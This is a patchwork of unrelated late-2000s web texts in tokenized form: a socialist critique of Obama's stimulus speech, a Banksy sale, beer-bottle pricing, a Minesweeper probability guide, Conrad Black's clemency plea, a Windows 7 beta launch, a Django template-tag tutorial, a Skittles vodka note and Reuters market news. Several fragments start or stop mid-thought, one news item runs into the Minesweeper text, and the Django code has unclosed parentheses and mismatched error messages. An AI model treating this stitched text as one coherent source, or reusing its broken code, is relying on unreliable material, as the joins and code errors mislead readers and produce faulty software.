If nothing is done , this recession could linger for years … our nation will sink deeper into a crisis that at some point we may not be able to reverse . ”
From one standpoint , the speech was a remarkable , if backhanded , acknowledgment by the incoming president of the failure of capitalist market economics and the prospect of a full - blown depression .
The past year has exploded all of the nostrums — the infallibility of the market , the virtues of financial “ risk - taking , ” the wizardry of Wall Street — that for decades were promoted as incontestable truths .
“ The result , ” Obama said , “ has been a devastating loss of trust and confidence in our economy , our financial markets , and our government . ”
However , apart from a few general denunciations of “ irresponsibility ” and “ greed , ” made to appease public anger , Obama failed to make any analysis of the causes of the crisis or the social interests that are responsible for the unfolding disaster .
There was a glaring contrast between the historic dimensions of the crisis , as portrayed by Obama himself , and the banal explanation he provided of its roots .
Obama failed to address the global dimensions of the crisis or deal at any level with the deep - seated structural contradictions of the US and world economy .
He cited undeniable facts — “ Wall Street executives made imprudent and dangerous decisions , seeking profits with too little regard for risk , too little regulatory scrutiny and too little accountability ” — without attempting to explain the underlying processes that made such practices all - pervasive .
There was no mention of the vast decline of America ’s manufacturing base , itself inextricably bound up with the growth of financial speculation .
He could not , therefore , present a coherent argument as to why the policies he was announcing could even begin to tackle the crisis .
On the contrary , Obama ’s proposed solution — the American Recovery and Reinvestment Plan — will allocate hundreds of billions of dollars in public funds , the bulk of which will flow into the coffers of the very banks and corporations that reaped massive profits from the policies that precipitated the crash of 2008 .
In a number of interviews leading up to Thursday ’s speech , Obama made a point of stressing that in formulating his stimulus plan he had consulted Republican politicians and economists — that is , the very forces who have been the most ferocious advocates of the “ free market ” policies that contributed to the crisis and who most directly aided and abetted the corrupt practices he criticized in his address .
The modus operandi of Obama ’s speech mirrored that employed three months ago to rush through Congress the Troubled Assets Relief Program ( TARP ) , which transferred $ 700 billion in taxpayer funds to the banks .
At that time , Bush took to the airwaves to issue dire warnings of recession and mass unemployment should Congress fail to act immediately to bail out the banks .
The aim was to create an environment of anxiety and preempt any public discussion of the causes of the financial crisis or the merits of the bailout bill .
Obama , then the Democratic presidential candidate , joined with the Democratic leadership in Congress to support the Republican administration ’s rescue of Wall Street .
Of course , the TARP windfall for the financial elite has done nothing to prevent the disaster it was supposed to avert .
The stimulus plan announced by Obama on Thursday will likewise do nothing to solve the economic crisis .
Once again , a dire economic crisis is being exploited to implement policies favorable to big business that could otherwise not be implemented .
In his speech , Obama did not put a price tag on his plan , generally estimated to total between $ 675 billion and $ 775 billion over two years .
Indeed , his transition team has repeatedly delayed submitting an actual plan to the new Democratic - dominated Congress , while Obama has sought to accommodate its provisions to the most right - wing factions in both parties .
Earlier this week he let it be known that some $ 200 billion initially allocated as part of infrastructure funding will instead go toward tax breaks , bringing the total in tax windfalls to $ 300 billion , half of which will go to business .
Ordinary families will get a mere $ 1,000 year in tax relief .
To further reassure the right wing and Wall Street , Obama on Wednesday held his first Washington press conference to announce that he would move to offset the increase in the federal budget deficit resulting from his stimulus plan by shrinking or eliminating scores of social programs and slashing spending for the core components of what remains of the American social safety net —
Social Security , Medicare and Medicaid .
In his speech on Thursday , while seeking to cast his plan as a boon to working people , Obama reiterated his intention to attack social programs , saying , “ And as I announced yesterday , we will launch an unprecedented effort to eliminate unwise and unnecessary spending …
We cannot have a solid recovery if our people and our businesses do n’t have confidence that we ’re getting our fiscal house in order . ”
He offered no explanation as to why it was the social programs on which tens of millions of workers and retirees depend that had to be cut to offset the expansion of budget deficits resulting from cash infusions to the banks and corporations .
The “ recovery ” Obama envisages will , in fact , do little to relieve the distress and suffering of working class families .
He declared his plan would “ create or save at least 3 million jobs over the next few years . ”
But the US economy lost nearly 2.5 million jobs in 2008 alone and , as Obama hinted , it will continue to lose millions of jobs in the coming years .
“ It will take time — perhaps many years ” before “ we can restore opportunity and prosperity , ” he declared , adding at another point that “ it is altogether likely that things may get worse before they get better . ”
In other words , even if Obama ’s plan is enacted immediately and in full , unemployment will continue to soar for the foreseeable future .
Obama outlined in vague terms his plan to invest in “ green ” energy , education , health care and infrastructure ( repair of bridges , roads , schools ) and provide relief to states and localities .
This , however , was framed by repeated assurances to the corporate elite that all spending on infrastructure would be funneled through the private sector , providing lucrative opportunities to cash in on the crisis .
He went out of his way to signal that he was far from proposing a new “ New Deal , ” contrary to the claims of his supporters among “ left ” and liberal groups .
“ It ’s not just another public works program , ” he said , adding that “ the overwhelming majority of the jobs created will be in the private sector … ” and that his goal “ is not to create a slew of new government programs , but a foundation for long - term economic growth . ”
While claiming his plan would address the foreclosure crisis , he qualified any government aid to families facing eviction by limiting it to “ responsible ” families .
Obama declared that he would oversee regulatory reform to halt “ reckless greed and risk - taking ” by banks and financial institutions , while reassuring Wall Street that the public funding spigots would remain open to bail out the most powerful firms .
“ It means preventing the catastrophic failure of financial institutions whose collapse could endanger the entire economy , ” he said .
He essentially whitewashed the pervasive fraud and criminality of the US financial elite and the collusion of the US government , saying , “ No longer can we allow Wall Street wrongdoers to slip through regulatory cracks .
No longer can we allow special interests to put their thumbs on the economic scales . ”
As though the plundering of the US economy over the past thirty years was a matter of a few “ wrongdoers ” and “ cracks ” in the government regulatory machinery !
In fact , parasitism and fraud on a colossal scale have become the mode of operation of the banks and the dominant feature of an economic system whose decay is expressed in the destruction of industry and the basic productive forces .
Successive administrations , Democratic as well as Republican , have systematically dismantled regulatory oversight of the banks , and the role of government regulators has been to facilitate fraudulent practices and shield the most powerful and influential perpetrators .
Throughout his speech , Obama was careful not to raise the basic social and class issues that dominate American society and underlie the crisis .
Thus , in his potted review of the financial meltdown , he made no mention of the most important result of decades of economic parasitism and political reaction — the immense growth of social inequality .
Obama ’s speech was laced with rhetorical generalities , evasions and non sequiturs .
What he could not say was that the responsibility for the crisis rests with the capitalist system .
There is no way out of the social disaster that is enveloping working people within the framework of the existing economic and political system .
The economic crisis in the US is part of a global failure of the capitalist system .
The only answer is a socialist program , including the nationalization of the major corporations and banks and their transformation into public institutions under the democratic control of the working class .
The control and management of the economy must be taken out of private hands so that economic life can be organized and developed to meet social needs , not private profit .

The UN Relief and Works Agency ( UNRWA ) has said Israel 's actions in Gaza should be investigated as possible war crimes .

SIX years ago a Melbourne woman made a purchase that was considered somewhat ludicrous by family and friends  she paid £ 500 for a stencil by the enigmatic British street artist Banksy .
But she is having the last laugh .
Three weeks ago , the Banksy canvas sold at auction in London for a hammer price of £ 90,000 ( $ A219,544 ) .
Laugh Now fetched nearly $ 220,000 when sold by its Melbourne owner .
The image is a modern classic  the now famous Banksy stencil of a chimp somewhat prophetically bearing a placard that reads " Laugh now , but one day we 'll be in charge " .
It sold three weeks ago at Bonhams ' Urban Art auction , exceeding its estimated price of £ 60,000 to £ 80,000 as two phone bidders battled it out .
The previous four Banskys to go under the hammer failed to sell .
Beer drinkers are hailing a victory against brewing giant Fosters over a pricing scandal linked to the downsizing of their favourite stubby .
A sales manager from the Fosters - owned Cascade Brewery in Hobart today admitted " we got it wrong " .
Cascade was accused in March of making a stealthy grab for more profits when it reduced the size of its 375 ml twist - top Pale Ale stubby by 45 ml to a sleeker " European - style " 330 ml bottle without changing the price .
Cascade spokeswoman Liz McLachlan today said the carton price of the 330 ml prise - top bottles , at the time of their launch , dropped by $ 4.27 per carton in Tasmania but stayed the same on the mainland .
" There was a wholesale price reduction in Tasmania , but not anywhere else , " Ms McLachlan said .
The brewer is promising to sell the resurrected 375 ml stubby at its 330 ml price .
But Tasmanians are set to benefit ahead of mainlanders again .
Cascade sales manager Dom Bury said Tasmanians would be the first to access the return of the 375 ml stubby from early November .
But the rest of Australia will follow " during 2009 " , he said .
Mr Bury put a positive spin on the about - face today as his team shouted beers at several Hobart pubs .
He said he was celebrating the change back after listening to beer drinkers who had not liked the change in size and said they preferred an easy twist top opening cap .
" We got it wrong , which is something we regret , and now we 're fixing it , " he said .
The move to reduce the stubby size - yet maintain the same price - resulted in a massive drop in sales with some outlets reporting a 50 per cent drop - off in sales .
Several website protests sprung up in outrage .

Minesweeper : Advanced Tactics
A Nasty Minesweeper Position
In this position , I know about a bunch of mines on all the remaining fronts , but I can't quite determine where they are .
There are a few mines that might be in one of two positions ( red or blue ) , a cluster of mines that might be in one of two arrangements ( green ) , and a more complex situation in the top left which I have n't marked explicitly , involving the ' 5 ' and the ' 6 ' .
Minesweeper : Logic or Probability
Minesweeper can be played two ways : as a game of logic or as a game of probability .
Technically , probability subsumes logic .
If you can logically prove a mine must be in a location , its probability must be 100 % ; if you can prove one cannot be , its probability must be 0 % .
So probability is all you need , in some sense .
Nonetheless , you use logical deduction to detect those 100 % situations ; sometimes , especially at easier difficulty levels , that 's all you need to complete a Minesweeper game ; no appeal to probabilities is necessary .
But there are definitely situations where all the logic in the world wo n't save you .
The ' T ' situation which appears in the bottom center of the game board above is a simple example of this -- slightly complicated by the extra nearby mines .
( The simplest scenario replaces the ' 2 ' with a ' 1 ' and the ' 5 ' with a ' 3 ' , so that it is symmetric . )
There is no way of getting any further information about the likely location of the one mine that remains in these two spaces .
It 's a 50 - 50 chance - - a toss of a coin .
When you find something like this , you 're probably better off taking a guess right away , rather than saving it for later -- so if you guess wrong , you wo n't have wasted a lot of extra time solving the rest of the board .
( I 'm a completist , so I save it for last , and do n't blame myself for guessing wrong .
And , mind you , it 's a bad game design that puts the win or loss of the game on the toss of a coin . )
An Endgame Tactic
One very easy endgame tactic you can use is counting the number of remaining mines .
Suppose I had resolved everything but the bottom right section of the board .
Here are the only two configurations of mines that match the data :
If you reach this position and the counter says there are only two mines left , you 're done ; it must be position B .
If the counter says there are three left , it 's not necessarily position A , though .
It could be position B with the remaining mine in one of the lower - right 3x3 cluster of squares .
In fact , the odds are in favor of it being B .
Local Probabilities
If you only examine the probabilities " locally " , you can see that each of the squares in the marked mutually exclusive groups have a 50 - 50 chance of being a mine .
By locally , I mean that if you have a ' 1 ' next to two unknown squares , each has a 50 % chance of being a mine .
The bottom center situation is exactly like this : each of squares adjacent to the unknown pair has exactly one mine unaccounted for , so each adjacent piece of data suggests a 50 % chance .
The very top left is similar :
The bottom right situation is somewhat like this as well ; each of the numbers on the " front " has one mine unaccounted for and two squares where it might be .
If a square had one unaccounted - for mine next to it , but three unexplored squares , each square would have a probability of 33 % ; four unexplored squares would give each a 25 % chance of having a mine .
If it had two unaccounted - for mines and three unexplored squares , each would have a probability of 66 % .
Here 's the " local probability " situation for the full board :
As you can see , several squares in the top left area have more than one probability ; the unexplored square adjacent to the ' 2 ' & ' 6 ' and the one adjacent to the ' 3 ' and the ' 5 ' .
( The one by the ' 5 ' and the ' 6 ' still has 66 % due to both , so there 's no apparent incompatibility . )
Resolving Local Probability Conflicts
You should be wondering at this point what it means to have conflicting local probabilities .
One intuition is that the bigger probability should win .
For example , the square between the 6 and the 2 must really be 66 % .
That would mean the leftmost square that 's assigned a 50 % is actually only 33 % , though .
Or you might think you combine the priorities somehow ; perhaps the chance should be 5/6 , or the average .
But none of these are really correct .
The data the probabilities are derived from are n't independent of one another , so no direct mathematics on the probabilities is valid .
The reason a local guess of 50 % is correct in the bottom center is because it really is independent of anything else .
If you randomly constructed boards which matched all the data collected so far , exactly half of them would have the mine in each of the two possible locations .
( Probabilty sometimes confuses people , who have trouble knowing what rules of probability apply in what situation .
This approach is essentially a guaranteed valid way , because it underlies the definition of probability as predictive statistics : measure across all possible arrangements that might have led to the current situation , assuming each was equally probable . )
Thus , the correct measurement for the top left situation involves looking through all possible arrangements of mines that meet the currently collected data , and measuring which percentage of them has a mine in the correct position .
This would be rather time consuming if we did it directly .
Fortunately , there are better methods .
Counting Arrangements
The abstract way of computing probabilities is to run through all possible arrangements of mines , discard the ones that do n't match the data we 've collected , and count up the statistics for each possible location .
A more practical approach is to only consider the ones that would n't get discarded at all .
To do that , you have to apply logic and generate all of the possible situations that could match the current data .
I already showed the two scenarios for the bottom right ; here are the possibilities for the top left :
( As before , the double - height oval indicates that a mine could be in either position with equal probability .
I might have listed each of these two cases separately , so there 'd be 10 arrangements , but it wo n't turn out to be useful .
As to the organization : the two rows ( numbered ' 1 ' and ' 2 ' ) are distinguished by the position of the mine in the fourth row .
The three columns are characterized by the position of the mines in the second row . )
Now , you might be tempted to simply say " aha , there are five cases , so we can count up the number of cases for each possible mine location " .
For example , the mine in the fourth row ( by the lower - left ' 1 ' ) is to the left in the two cases in row 1 , and to the right in the three cases in row 2 .
So you could attempt to argue that it has a 60 % chance of being to the right , adjacent to the ' 6 ' .
( This is a position that has conflicting local probabilities of 50 % and 66 % . )
However , this misses an important subtlety -- the number of mines in different in some of the cases ; there are 6 mines in A1 , 4 mines in B2 , and 5 in the other cases .
Counting Unencountered Mines
Let 's return to the simpler bottom right scenario to explore this subtlety in detail .
Suppose that I 've completed all of the rest of the board , and I know there are exactly three mines remaining .
One temptation might be to assume that configuration A , with exactly three mines , is more likely .
This is incorrect .
Another temptation would be to consider how many total mines there were , and how many board squares , and to say " what are the odds that the bottom 3x3 region would be empty " .
This is incorrect .
The exact reason why this is incorrect is complex to explain , and could perhaps be likened to the Let 's - Make - a - Deal " paradox " .
Suffice it to say , however , that the actual odds for this situation are independent of the total number of mines and the total board size .
The real answer is this : how many possible arrangements of three mines are there that fit the knowledge I have of the board ?
The picture shows two : configuration A and configuration B . But B only has two mines .
The third mine could be in any of the bottom 3 - by - 3 region of squares for which I have n't collected any data .
There are thus nine variant B configurations ; I just have n't gone to the effort of drawing them out .
Thus , there are ten possible arrangements .
Each of these ten arrangements is equally likely to occur .
( As mentioned before , this is the crucial notion to understanding probability .
The odds of the computer having generated any of these cases the first place was small , but it was equally small , because the computer [ as far as we know ] was giving every arrangement an equal chance .
You are equally likely to toss ten heads in a row as you are to throw the pattern two heads , one tails , one heads , three tails , one heads , one tails , one heads .
You 're more likely to throw a total of five heads and five tails than ten heads , but not any particular pattern of heads and tails .
In Minesweeper , we 're concerned with arrangements of mines , which are like patterns of coin tosses . )
Since each of the ten arrangements ( nine for B , one for A ) is equally likely to occur , configuration B is 90 % likely in this particular scenario !
If there were four mines left at this point , then configuration A would have nine variants .
Configuration B would have one variant for each arrangement of two mines in the bottom left corner ; this is C ( 9,2 ) , which is 9 ! / ( ( 9 - 2 ) ! * 2 ! ) , or 9 * 8/ 2 , which is 36 .
In this case , configuration B is only 75 % likely .
With five mines , configuration A has 36 variants , and configuration B has 9 * 8* 7/6 = 84 variants ; so the odds for B are just over 66 % .
With six mines , B is about 60 % likely .
With seven mines , B is only 50 % likely .
With eight mines , B is lesslikely than A ; at this point , there are so many extra mines to go into the remaining locations that there are fewer configurations .
Consider the worst case , where there are 11 mines remaining .
( This is extremely unlikely to occur , but if it did occur , these probabilities would apply . )
With configuration B , all the unencountered square must have a mine ; with configuration A , all but one does -- and thus there are 9 variants for A , and only one for B .
A Final Solution
In the actual board under discussion , there are 9 mines remaining .
One of those goes to the bottom center , which has a totally independent choice that we can ignore .
Therefore , we consider the full board except for that case ; there are only eight mines unaccounted for .
( I 'll continue to explicitly count the oval in the top left since it's in the picture for the top left , just to be unambiguous . )
Any combination of a top - left configuration and a bottom - right configuration could occur , except one of them ( A1 + A ) which would require nine mines .
Therefore , we have to enumerate each of these possible configurations , and count up the remaining mines and the unencountered squares .
Actually , the number of unencountered squares is independent : there are nine in the bottom right and three in the top left , so there are 12 total .
Top Left Bottom Right Number of Mines Mines Left Unencountered Variants A1 B 8 0 1 B1 A 8 0 1 B1 B 7 1 12 A2 A 8 0 1 A2 B 7 1 12 B2 A 7 1 12 B2 B 6 2 66 C2 A 8 0 1 C2 B 7 1 12
Thus , there are a total of 118 possible combinations .
From this you can count the number of combinations for each of the top left and bottom right configurations independently :
Configuration Variants Percentage A1 1 1 B1 13 11 A2 13 11 B2 78 66 C2 13 11 A 15 13 B 103 87
Next , I went through each square on the board and computed its probability , by adding up the number of variants in which it appeared , dividing by 118 .
( Actually , by just adding the percentages above . )
Also , on average each unencountered square had a mine in 15 of the 118 variants ( after all , the odds that at least one unencountered square has a mine is very high ) .
[ This can be computed by multiplying the number of mines left by the unencountered variants , which tells you the average number of mines on unencountered squares . ]
( Note that this does n't show all of the information available .
For example , we know that the probability of the the two dark green ' 87 ' squares are linked -- if one is true , the other must be .
Similarly , the three pale blue ' 13's that are mines for configuration A are also linked .
The remaining pale blue ' 13's are not linked -- rather , if any one were to be a mine , the odds of any of the remaining ones being mines decreases . )
Playing the Game
Odds are you 're not going to want to sit down and work out all that math when you 're playing a minesweeper game .
Neither did I .
I did enumerate the possible configurations in the top - left and bottom - right .
I noticed that one configuration ( B2 - B ) used one fewer mines than all the others .
I applied the " fewer mines means more unencountered variants " rule of thumb ( which applies roughly until the number of unencountered - squares is less than double the number of unaccounted - for mines ) , which means that configurations that use fewer mines are much more likely .
Since there were a lot of configurations in the top - left , determining the odds for any one square is somewhat complicated .
Therefore , I just figured that configuration B in the bottom - right was a lot more likely , and guessed one of the appropriate squares .
( I hoped that this would allow me to complete the bottom - right , and then armed with more knowledge about the number of mines remaining I could complete the top left , and I 'd only be left with the center bottom coin toss .
Of course , ideally I 'd pick a square that will maximize the likelihood I 'd get useful information , but any of these guesses would have allowed me " entry " into the bottom right corner for further data collection . )
The odds favored configuration B , so I picked a square that had a mine for configuration A .
Eight times out of nine , I would have been right .
Black was convicted in July 2007
Former media tycoon Conrad Black is appealing to US President George W Bush to commute his prison sentence for fraud and obstruction of justice .
Black , a Canadian - born member of the UK's House of Lords , has been in prison since March , serving a sentence of six and a half years .
The US justice department confirmed it had received the appeal and said it would be considered in the normal way .
Mr Bush has the power to issue a pardon and reduce a prison sentence or fine .
The US Pardon Attorney , Ronald Rogers , will investigate and review the appeal , and make recommendations to the president .
Of approximately 10,000 petitions received by the Pardon Attorney , only 163 have resulted in a presidential pardon or reduced sentence .
Black and three other executives were convicted of defrauding shareholders of one - time newspaper publishing giant Hollinger International Inc .
A US federal appeals court unanimously upheld his conviction this summer .
He is serving his sentence in Florida 's largest prison , the Coleman Federal Correctional Complex .
Details of the appeal were not immediately available .
This long NYT retrospective on the seminal news - photos of some guy named George Bush during his presidency ends with photos of the man on his way to his farewell address , during which it appears that he 's been crying in the bathroom .
I 've looked at it several times now and I 'm not sure I agree that 's what 's going on — this facial expression seems to contain a lot more than mere sorrow .
And I turned to one of my editors – First I said , " Oh , my God . "
And he said , " What ? "
And I said , " You 've got to see this picture of Bush .
This is really stunning . "
And I flipped it over to him to process and his first reaction was , " Wow . "
And I said , " If he was n't just back there behind that door crying , I do n't know what that look on his face is . "
Because he just looks absolutely devastated as he comes through this door after essentially ending his eight year presidency .
And it 's just really striking .
He just looks absolutely devastated .

LAS VEGAS – Microsoft 's excitable CEO Steve
Ballmer showed off Windows 7 – the slick , fast , user - friendly successor to the much - maligned Windows Vista – and said it will be available as a public beta on Friday .
Unveiled by an intense Ballmer during his keynote address on the eve of CES 2009 , Windows 7 will offer better performance on underpowered machines such as netbooks , support for multitouch interfaces , and simplified home networking .
Ballmer said that this would be the " best version of Windows ever " and pointed out features that implicitly acknowledged the problems with Windows Vista .
" We are putting in all the right ingredients – simplicity , reliability and speed – and working hard to get it right and to get it ready , " said Ballmer .
Ballmer 's keynote is his first at the big , prestigious CES show since the departure of Microsoft founder Bill Gates a year ago .
He showed no signs of stage fright , bounding onstage in a maroon pullover , rubbing his hands together and grinning eagerly .
Microsoft is also eager to get Windows 7 into people 's hands given the negative reaction to Windows Vista , which was widely panned .
Released in 2007 , Vista annoyed many customers with its hunger for computing resources and its seemingly incessant security notifications .
Those notifications were such a defining characteristic of Vista that they were even satirized in Apple commercials .
Despite the criticisms , Microsoft sold 20 million copies of Vista in the first month , and there are now an estimated 300 million users of Vista worldwide .
According to Ballmer , Windows 7 will be available to developers immediately , and to the general public on Friday , January 9 .
It will be a free download from Microsoft 's site .
Windows 7 has been widely anticipated since developers got the first glimpse of it at a Microsoft conference earlier this year .
Microsoft promises that the new OS will have faster startup and shutdown times , fewer security alerts , and will provide better power management leading to improved battery life on laptops .
Microsoft showed off Windows 7's support for multitouch interfaces , simplified home networking , and easier management of peripheral devices such as cell phones and digital cameras .
In addition , the OS will have an updated Taskbar , new animated desktop effects , context - sensitive menus and a smarter desktop search tool .
And it will be svelte enough to run on a netbook with as little as 1GB of RAM and a 1GHz processor , Microsoft has promised .
This is the only public beta of Windows 7 , a company spokesperson confirmed .
The company did not announce the exact date of Windows 7's commercial release .
Windows 7 is only one part of Microsoft 's three - pronged strategy to provide software for what Ballmer called the " three screens " – PCs , phones and TVs .
" I believe windows will remain at the center of people 's technological solar system , " Ballmer said , touting the company 's efforts in the mobile , online , and home entertainment markets .
For instance , Ballmer announced that its online software suite , Windows Live Essentials , will be coming out of beta as of tomorrow .
The company announced several Windows Live partnerships , including one with Facebook , which will allow Facebook users to share content that they 've uploaded into their Facebook accounts with their Windows Live accounts .
Similar interconnectivity already exists between Windows Live and Flickr .
Also , Dell will be preloading Windows Live Essentials on its computers , replacing the Google Toolbar .
Ballmer promised a new version of Microsoft's OS for smartphones , Windows Mobile , to come in the first quarter of 2009 .
This OS will include support for Adobe Flash - based apps , including the video players used on many sites , such as YouTube .
After Ballmer , Microsoft 's Robbie Bach took the stage to tout the company 's Xbox 360 and Xbox Live products .
According to Bach , 28 million Xbox consoles have been sold to date , and there are 17 million active users of the Xbox Live service .
The company will also be releasing two new Halo games in 2009 , including Halo Wars , a strategy game that will ship on March 3 , and Halo 3 : Orbital Drop Shock Trooper .
Wrapping up the keynote , Ballmer and another Microsoft executive gave a demo of a futuristic multitouch application for students that made use of many technologies from the company 's R&D labs , including automatic document summarizing and highlighting of key points , organizing notes along topical timelines , and collaborating with other students on a Microsoft Surface - type touch - sensitive table .
They also showed what they said was a prototype flexible display , although the image shown on the bendable plastic did not seem particularly dynamic .

Template tags can be useful for making your applications more reusable by other projects .
For this example I will be adding to the books project that I started in a previous post .
Also , I ’ve bundled the example files into a google code project .
Start off by creating a folder called templatetags in your app directory and create two files in it .
The first one named __init__.py and the second book_tags .py .
There ’s 3 things that we need to accomplish with our template tags .
The first is to create a tag that will output the url for the action of the form .
For example , { % get_book_form_url foo_object %}
Next we need to get the form and assign it to a template variable that can be specified by the template variable .
For example , { % book_form as bar_var %} .
And the third template tag will get the books for an object and place in a template variable .
For example , { % books_for_object foo_object as bar_var %} .
from django .
template import Library , Node , TemplateSyntaxError from django .
template import Variable , resolve_variable from django .
utils .
translation import ugettext as _ from django .
contrib .
contenttypes .
models import ContentType from django .
core .
urlresolvers import reverse from books .
models import Book register = Library ( ) def get_contenttype_kwargs ( content_object ) : " " " Gets the basic kwargs necessary for form submission url " " " kwargs = { ' content_type_id ' : ContentType. objects .
get_for_model ( content_object ) . id , ' object_id ' : getattr ( content_object , 'pk ' , getattr ( content_object , ' id ' ) ) , } return kwargs def get_book_form_url ( content_object ) : " " " prints url for form action " " " kwargs = get_contenttype_kwargs ( content_object ) return reverse ( ' new_book ' , kwargs=kwargs ) class BooksForObjectsNode ( Node ) : " " " Get the books and add to the context " " " def __init__ ( self , obj , context_var ) : self . obj = Variable ( obj ) self .
context_var = context_var def render ( self , context ) : content_type = ContentType. objects .
get_for_model ( self . obj . resolve ( context ) ) # create the template var by adding to context context [ self .
context_var ] = \ Book. objects .
filter ( # find all books for object content_type__pk = content_type .
id , object_id = self .
obj . resolve ( context ) . id ) return '' def books_for_object ( parser , token ) : " " " Retrieves a list of books for given object { % books_for_object foo_object as book_list %} " " " try : bits = token .
split_contents ( ) except ValueError : raise TemplateSyntaxError ( _ ( ' tag requires exactly two arguments ' ) if len ( bits ) ! = 4 : raise TemplateSyntaxError ( _ ( ' tag requires exactly three arguments ' ) if bits [ 2 ] ! = ' as ' : raise TemplateSyntaxError ( _ ( " second argument to tag must be ' as ' " ) return BooksForObjectsNode ( bits [ 1 ] , bits [ 3 ] ) def book_form ( parser , token ) : " " " Adds a form to the context as given variable { % book_form as form %} " " " # take steps to ensure template var was formatted properly try : bits = token .
split_contents ( ) except ValueError : raise TemplateSyntaxError ( _ ( ' tag requires exactly two arguments ' ) if bits [ 1 ] ! = ' as ' : raise TemplateSyntaxError ( _ ( " second argument to tag must be ' as ' " ) if len ( bits ) ! = 3 : raise TemplateSyntaxError ( _ ( ' tag requires exactly two arguments ' ) # get the form return BookFormNode ( bits [ 2 ] ) class BookFormNode ( Node ) : " " " Get the form and add it to the context " " " def __init__ ( self , context_name ) : self .
context_name = context_name def render ( self , context ) : from books .
forms import NewBookForm form = NewBookForm ( ) # create the template var by adding to context context [ self .
context_name ] = form return '' # register these tags for use in template files register .
tag ( ' books_for_object ' , books_for_object ) register .
tag ( ' book_form ' , book_form ) register .
simple_tag ( get_book_form_url )
Add this to your template
To start adding books to an object , add this code to your template and change my_awesome_object_here to the template variable name of your object .
<h2 > Books </ h2 > { % load book_tags %} { % books_for_object my_awesome_object_here as books %} { % for book in books %} < a href= " {{ book.get_absolute_url }} " >{{ book }}</a> - {{ book .
description }} { % endfor %} < h2 > Add a book </ h2 > < form action= " { % get_book_form_url my_awesome_object_here %} " method= " post " > { % book_form as form %} {{ form }} < input type = " submit " value = " Go " /> </ form >
You can get the template tags source code and the code from the previous post at the google code project page or by doing
svn co http://django-books.googlecode.com/svn/trunk books
in a directory on the python path .
I use webfaction to host a lot of my django projects .
It has an easy setup that will get you developing quickly and a great community of talented programmers .
There is also a quick setup for rails , wordpress , and a lot more .

Due to the popularity of the Infamous Skittles Vodka , I have decided to photograph my experiences making it . :
Yes , I 've heard that you can use coffee filters instead of paper towels to strain the vodka .
I chose not to do that because a ) paper towels are cheaper and b ) I 've heard from several sources that paper towels actually work a lot better than coffee filters . :
I get a lot of people asking me about the taste of these , so I 'm editing the entry with my comments on it :
The vodka had too much of an " alcohol " taste for me to enjoy taking shots of it , but it was absolutely divine mixed with Sprite .
I got a pretty good buzz going really quickly - you drink it fast because it does n't taste alcoholic at all once mixed .
If I had used better vodka , the alcohol taste might have been bearable without it being mixed .
I do n't typically enjoy shots in the first place though , so your experience may differ .
Windows 7 is out and up for download , provided you 're OK with using a beta operating system .
It promises a raft of improvements over Windows Vista , but how 's it shaping up for games ?

FiringSquad have taken a look at how it runs across two systems : a mid-spec one ( AMD Athlon X2 5000 + Black Edition ) and a high - end machine ( Intel Core i7 965 Extreme Edition ) .
While the results areworth a look at , it 's worth remembering , remembering then remembering again that Windows 7 is still in beta .
So there 's room for improvement .
Anyway , that caveat out of the way , above are some of the results more relevant to you , the game - playing public .

NEW YORK ( Reuters ) -
The prospect of new tax cuts in the United States and Germany injected a measure of New Year cheer on Monday , even as automakers wrapped up 2008 as their worst in more than 15 years with yet another month of slumping U.S. sales .
Automakers continue to suffer from weak U.S. demand , with General Motors Corp , Ford Motor Co and Toyota all reporting December sales declines of more than 30 percent .
Asian stocks climbed to a two - month high on optimism that massive government spending programs will revive global growth , and European shares also advanced , though U.S. stocks gave back part of the strong gains racked up last week .
In a move that could help speed approval of a new stimulus plan in the United States , U.S. President - elect Barack Obama will seek as much as $ 310 billion in tax cuts as part of a move to counter what senior policymakers warned could be a prolonged period of economic stagnation and deflation .
Still , one top Democratic senator said enactment would not likely come until February despite congressional Democrats ’ hopes to present the incoming president with a stimulus measure to sign in the early days of his term .
In Germany , Chancellor Angela Merkel met her Social Democrat ( SPD ) coalition partners to discuss a second fiscal stimulus deal worth up to 50 billion euros .
That would come on top of a 31 billion euro package last year that Merkel ’s critics -- including some European Union allies -- believe was too small to haul Europe ’s leading economy out of recession .
Merkel on Sunday came out in favor of tax relief moves she had previously ruled out until after September ’s federal election .
But she faced tough talks to get the SPD to agree .
“ It will be very difficult to get a common denominator on tax , ” Andrea Nahles , SPD deputy leader , told German radio .
No firm decisions were expected on Monday , but a government spokesman said talks would prepare the groundwork for a January 12 deal .
The stimulus plans by the world ’s No. 1 and No. 3 economies mark the latest attempts to tackle a financial crisis that began with U.S. mortgage defaults in 2007 and snowballed into global market turmoil that threatens much of the world with a deep recession .
Along the way , the crisis has reshaped the banking landscape and pushed countries to the brink of bankruptcy .

Chrysler LLC led the industry lower with U.S. sales that dropped by 53 percent in December , a month when the struggling automaker and larger rival GM fought to clinch a $ 17.4 - billion bailout from the U.S. government .
Toyota Motor Corp , the world ’s largest automaker , posted a sales drop of 37 percent , followed by Honda Motor Co at 35 percent and Ford Motor Co at 32 percent .
GM and Nissan Motor
Co saw sales drop 31 percent .

That followed December auto sales figures from Japan and France , which posted steep falls of 22 percent and 15.8 percent , respectively , adding to a swathe of grim data from an industry bearing the brunt of wrecked consumer confidence .
Meanwhile overseas , data published on Monday increased the pressure on the ECB to keep cutting interest rates .
Spanish inflation in December was the lowest in a decade , at 1.5 percent , while Italian inflation fell to a 14 - month low of 2.3 percent .
In Asia , December data showed greater - than - expected easing of inflation in Thailand , Indonesia and Taiwan , raising the prospect of temporary deflation and further rate cuts there .

Some investors , however , have begun to make tentative bets that the worst of the turmoil , which took a sharp turn for the worse in September with the collapse of investment bank Lehman Brothers , is over .
Kicking off the first full week of 2009 , they pushed up Asian and European stocks , the dollar and commodities while selling safe - haven plays such as government bonds and the Japanese yen .
In the United States , government spending on projects helped limit a decline in construction spending to 0.6 percent in November , beating Wall Street forecasts , although private home building remained dismal and was likely to keep tumbling .
SURPRISE UPTURN
Sentiment among euro zone investors improved for the first time in seven months in January , showing its biggest rise since August 2005 , though morale among the 16 nations remained negative , the Sentix research group said .
“ In the eyes of investors , measures taken by many states and central banks worldwide seem to be having an impact .
We assume many indicators will follow the early indication from Sentix in the coming weeks and months , ” Sentix said .
Asian stocks hit a two - month high and the FTSEurofirst 300 fell 1.9 percent , but U.S. stocks dipped nearly 1 percent .
Oil prices were above $ 48.50 a barrel as crude extended its rise to more than 40 percent since late December on Israel ’s incursion into Gaza and the Russian gas dispute continued .

The question in a task like this is always , " Where do we start ? "
In this case , I think we need to begin with a clear idea about what sort of community we are trying to encourage .
